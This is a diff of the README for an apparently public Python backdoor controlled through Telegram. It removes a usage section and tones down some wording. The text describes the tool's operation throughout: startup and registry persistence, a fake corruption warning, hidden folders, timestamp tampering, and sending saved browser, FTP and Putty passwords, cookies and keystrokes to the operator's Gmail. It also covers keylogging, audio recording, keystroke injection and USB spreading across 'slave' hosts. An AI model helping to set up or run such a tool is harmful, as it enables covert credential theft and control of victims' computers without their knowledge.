@@ -83,16 +83,6 @@ A python based backdoor which uses [Telegram](https://telegram.org/) as C&C serv
 * Set copied_startup_filename in Eclipse.py.
 * Set Gmail password and Username in /Breathe/SendData.py
 
-# Usage
-* Run eclipse.py on host
-  * On first run:
-    * Files will be copied to startup path
-    * Registry entry will be made
-    * Warning message will appear that file is corrupted.
-    * Folders will be made and set to hidden state.
-    * Passwords and cookies will be sent.
-    * Timestamps will be changed
-* Control host from the Telegram app by sending commands.
 
 # Abilities
 * whoisonline- list active slaves
@@ -108,7 +98,7 @@ A python based backdoor which uses [Telegram](https://telegram.org/) as C&C serv
 > This will download files in the host computer.
 
 * execute- shutdown, restart, logoff, lock
-> This is to mess with the host :D or refresh if things are not working properly
+> Execute the following commands
 
 * screenshot- take screenshot
 > Take screenshot of the host of computer.
@@ -117,7 +107,7 @@ A python based backdoor which uses [Telegram](https://telegram.org/) as C&C serv
 > This command will sends passwords (saved browser passwords, FTP, Putty..), directory tree of host (upto level 2), logged keystrokes and windows which are currently open
 
 * set- email (0:Default,1:URL,2:Update), filename (0: Itself, 1: Others), keystrokes (text)
-> This command can set email template (default, download from url, update current template with text you'll send), rename filenames, insert keystrokes in host :D
+> This command can set email template (default, download from url, update current template with text you'll send), rename filenames or insert keystrokes in host.
 
 * start- website (URL), keylogger, recaudio (time), webserver (Port), spread
 > This command can open website, start keylogger, record audio, start webserver, USB Spreading
